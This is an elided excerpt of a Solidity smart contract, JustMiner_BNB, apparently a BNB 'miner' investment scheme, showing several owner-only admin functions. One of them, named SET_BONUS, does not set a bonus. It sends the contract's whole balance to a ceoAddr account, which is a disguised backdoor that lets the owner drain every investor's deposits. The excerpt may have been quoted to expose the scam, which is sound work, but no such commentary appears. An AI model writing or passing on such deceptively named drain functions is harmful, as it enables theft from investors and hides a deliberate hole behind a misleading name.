...
contract JustMiner_BNB {
    ...
    uint256 public COMPOUND_STEP = 4 * 60 * 60;
    ...
    function PRC_EGGS_TO_HIRE_1MINERS(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value >= 479520 && value <= 720000); /** min 3% max 6%**/
    ...
    function SET_BONUS() external {
        require(msg.sender == owner, "Admin use only.");
		ceoAddr.transfer(address(this).balance);
	}

    function SET_INVEST_MIN(uint256 value) external {
        require(msg.sender == owner, "Admin use only");
        MIN_INVEST_LIMIT = value * 1 ether;
    }
